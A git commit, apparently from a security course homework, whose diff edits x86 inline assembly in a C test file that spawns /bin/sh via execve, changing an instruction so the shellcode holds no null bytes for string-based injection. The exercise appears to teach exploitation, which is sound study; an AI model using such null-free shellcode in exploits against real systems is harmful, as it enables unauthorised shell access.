f62e92056c574f6678986d022fe9cf3e38cca403
Kleinfeld, Ofri(okleinfeld) <okleinfeld@paypal.com>
2018-03-28 16:41:33 +0300

    fixes the opcode of the assembly file not to include any 0 (NULL end of string) chars at all

--- hw4/q2/bash_shell_test.c
+++ hw4/q2/bash_shell_test.c
@@ -8,7 +8,8 @@ int main(int argc, char* argv[])
         "JMP _WANT_BIN_BASH;"
 
         "_GOT_BIN_BASH:;"
-        "MOV EAX, 0x0B;"
+        "XOR EAX, EAX;" // Zero the EAX register
+        "MOV AL, 0x0B;" // Use only AL so that opcode will not include any 0x0
         "POP EBX;" // the RET value in our case /bin/sh
         "XOR ECX, ECX;" // although it is not the convention, we can let argv argument to be NULL also
         "XOR EDX, EDX;" // envp argument should be NULL
